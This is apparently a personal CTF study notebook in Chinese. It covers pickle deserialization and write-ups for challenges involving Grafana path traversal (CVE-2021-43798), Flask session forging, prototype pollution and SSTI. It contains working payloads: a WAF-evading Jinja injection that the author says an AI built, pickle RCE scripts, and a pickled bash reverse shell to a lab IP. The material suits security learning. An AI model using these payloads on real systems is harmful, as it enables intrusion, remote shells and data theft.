# 笔记
## pickle反序列化
### 基本介绍
#### 原理
Pickle 不只是存储数据，它还能够描述对象的重建过程，并在重建过程中调用函数。
#### pickle常用方法

| 函数                              | 作用                                   |
| ------------------------------- | ------------------------------------ |
| `pickle.dumps(obj, protocol=0)` | 将对象序列化为字节串，protocol=0是文本协议，2，3是二进制协议 |
| `pickle.loads(data)`            | 从字节串反序列化对象                           |
| `pickle.dump(obj, file)`        | 序列化并写入文件                             |
| `pickle.load(file)`             | 从文件读取并反序列化                           |

### 常见魔术方法
#### \_\_reduce__()
返回值：元组
```python
(callable, args)               # 最常见
(callable, args, state)        # 带状态
(callable, args, state, listitems, dictitems)
```
触发时机：反序列化时根据序列化结果去调用对应的 callable。
```python
obj = callable(*args)
# 如果有 state，还会再调用 obj.__setstate__(state)
```
举例：
```python
class Evil:
    def __reduce__(self):
        return (os.system, ('id',))
```
#### \_\_setstate__()
触发时机：pickle.loads() 重建对象后，如果序列化数据里带有 state，并且callable为自己时就会调用 obj.\_\_setstate__(state)。


# 题目
### CVE-2021-43798
原理：Grafana 有一个公开的 API 端点 `/public/plugins/:pluginId`，设计用途是让用户访问已安装插件的静态资源（如 CSS、JS、图标）。其预期的文件读取范围应该被严格限制在插件自身的目录内。但是Grafana 在处理插件静态资源请求时，未能对用户可控的文件路径进行有效净化，导致攻击者可以利用 `../` 序列跳出插件目录，读取服务器上的任意文件。
访问/public/plugins/prometheus/../../../../../../../../etc/passwd成功但没找到flag
![image.png](https://utakataimg-1420949982.cos.ap-guangzhou.myqcloud.com/pubimg/20261024150730757.png)
尝试直接访问/public/plugins/prometheus/../../../../../../../../flag成功，找到flag
![image.png](https://utakataimg-1420949982.cos.ap-guangzhou.myqcloud.com/pubimg/20261024150852348.png)
###  \[SWPUCTF 2025 秋季新生赛]我是复读机
前端过滤了右键和键盘，禁掉js即可绕过，源代码中发现存在robots.txt
![image.png](https://utakataimg-1420949982.cos.ap-guangzhou.myqcloud.com/pubimg/20261024151825395.png)
访问/robots.txt发先/UploAds
![image.png](https://utakataimg-1420949982.cos.ap-guangzhou.myqcloud.com/pubimg/20261024152041008.png)
访问源代码发现以POST方式提交，payload表单到/render
![image.png](https://utakataimg-1420949982.cos.ap-guangzhou.myqcloud.com/pubimg/20261024154948416.png)
尝试提交，发现权限不够
![image.png](https://utakataimg-1420949982.cos.ap-guangzhou.myqcloud.com/pubimg/20261024164956299.png)
去返回出来的/forbidden2找到secret
![image.png](https://utakataimg-1420949982.cos.ap-guangzhou.myqcloud.com/pubimg/20261024155041252.png)
解码flasksession发现第一部分为{user:guest}，遂用secret伪造session，拿到权限
![image.png](https://utakataimg-1420949982.cos.ap-guangzhou.myqcloud.com/pubimg/20261024172757646.png)
接下来构造恶意payload进行SSTI注入，但是有WAF过滤遂向grok大人寻求帮助
经过grok的测试，被过滤的关键词如下：
```python
os / popen / class / globals / builtins / import / open / read
```
下面的payload由grok构造
payload={{(lipsum|attr('__glo'+'bals__')|attr('get')('o'+'s')|attr('po'+'pen')('cat%20/f*')|list)}}
![image.png](https://utakataimg-1420949982.cos.ap-guangzhou.myqcloud.com/pubimg/20261024172229658.png)
### \[NSSRound#13 Basic]flask?jwt?
注册账号后登录点击getflag提示权限不够，最终在重置密码界面（/changePassword）的源代码里找到secret
![image.png](https://utakataimg-1420949982.cos.ap-guangzhou.myqcloud.com/pubimg/20261024190734518.png)
伪造flask session（把_user_id改为1），重新访问/getFlag拿到flag
![image.png](https://utakataimg-1420949982.cos.ap-guangzhou.myqcloud.com/pubimg/20261024191015419.png)
![image.png](https://utakataimg-1420949982.cos.ap-guangzhou.myqcloud.com/pubimg/20261024190646600.png)
### 马哈鱼商店
注册登录后买下flag发现是假的，注意到最后一个商品叫pickle，遂想买之，但由于钱不够买不起，查看源代码发现我们购买时需要提交pid和discount参数，遂抓包修改discount打骨折进行购买
![image.png](https://utakataimg-1420949982.cos.ap-guangzhou.myqcloud.com/pubimg/20261024204110080.png)
发现/pickle_dsa路由，访问
![image.png](https://utakataimg-1420949982.cos.ap-guangzhou.myqcloud.com/pubimg/20261024204019595.png)
代码审计后发现pickle反序列化漏洞
![image.png](https://utakataimg-1420949982.cos.ap-guangzhou.myqcloud.com/pubimg/20261024204419037.png)
poc如下，b64encode是为了绕过源代码的try except，把字节流decode成字符串是因为GET提交的参数只能放在URL里，而URL只允许ASCII码
```python
import pickle
import os
import base64


class RCE:
    def __reduce__(self):
        return (eval, ("__import__('os').popen('env').read()",))


payload = pickle.dumps(RCE(), protocol=0)
assert b"\x00" not in payload
assert b"\x1e" not in payload
print(base64.b64encode(payload).decode())
```
输入生成的payload拿到flag
![image.png](https://utakataimg-1420949982.cos.ap-guangzhou.myqcloud.com/pubimg/20261024222243176.png)
### Ez_override
dirsearch扫目录扫出源码/src，代码审计后发现safe_merge里存在全局变量污染风险，故思考通过这个函数拿到admin权限，根据代码审计的结果，secret_key在当前模块中，可以通过修改noting.\_\_init__.\_\_globals__.app.secret_key来覆盖secret_key从而伪造flask session
而/p0l1Ut3正是实现上述想法的好地方，生成对应payload的poc如下
```python
import json

src = {"__init__": {"__globals__": {"app": {"secret_key": "utakata"}}}}
src_json = json.dumps(src)
print(src_json)        
```
污染密钥
![image.png](https://utakataimg-1420949982.cos.ap-guangzhou.myqcloud.com/pubimg/20261025171605883.png)
伪造签名
![image.png](https://utakataimg-1420949982.cos.ap-guangzhou.myqcloud.com/pubimg/20261025171807437.png)
成功获得admin权限
![image.png](https://utakataimg-1420949982.cos.ap-guangzhou.myqcloud.com/pubimg/20261025171518990.png)
然后在p1ckI3尝试进行pickle反序列，执行whoami发现没回显，遂尝试shell反弹（这里因为靶机都在同一个局域网内不需要使用公网IP，否则需要有一台VPS而不是虚拟机）
poc如下，这里注意protocol=0纯文本编码绕过\x00\x1e，fix_imports=False防止subprocess被映射成commands从未导致奇怪的错误：
```python
import pickle
import os
import base64
import subprocess

class RCE:
    def __reduce__(self):
        cmd = "bash -c 'sh -i >& /dev/tcp/192.168.93.129/7777 0>&1'"
        return (subprocess.getoutput, (cmd,))


payload = pickle.dumps(RCE(), protocol=0, fix_imports=False)
assert b"\x00" not in payload
assert b"\x1e" not in payload
assert b"os" not in payload
assert b"builtins" not in payload
print(base64.b64encode(payload).decode())

```
成功连上
![image.png](https://utakataimg-1420949982.cos.ap-guangzhou.myqcloud.com/pubimg/20261025181116887.png)
![image.png](https://utakataimg-1420949982.cos.ap-guangzhou.myqcloud.com/pubimg/20261025181147791.png)
### 长月夜
源码审计后发现jwt纯摆设，他只进行解码而不验证签名，所以只要把user改为admin密钥随便填一个a-string-secret-at-least-256-bits-long就行
下面这部份代码进行判断，如果en.min_public_time早于2025-08-03即可输出flag，可以前面的通过merge进行js污染覆盖min_public_time
```python
app.post('/admin_club1st', Admin_Check, (req, res) => {
    let body = req.body;
    let evernight = Object.create(CONFIG);
    let min_public_time = CONFIG.min_public_time || DEFAULT_CONFIG.min_public_time;
    merge(evernight, body);    
    let en = Object.create(CONFIG);

    if (en.min_public_time < "2025-08-03") {
        return res.render('march7th', {message: FLAG});
    }

    return res.render('evernight');
});
```
payload：
```json
{"__proto__":{"min_public_time": "2025-08-01"}}
```
![image.png](https://utakataimg-1420949982.cos.ap-guangzhou.myqcloud.com/pubimg/20261025193815984.png)
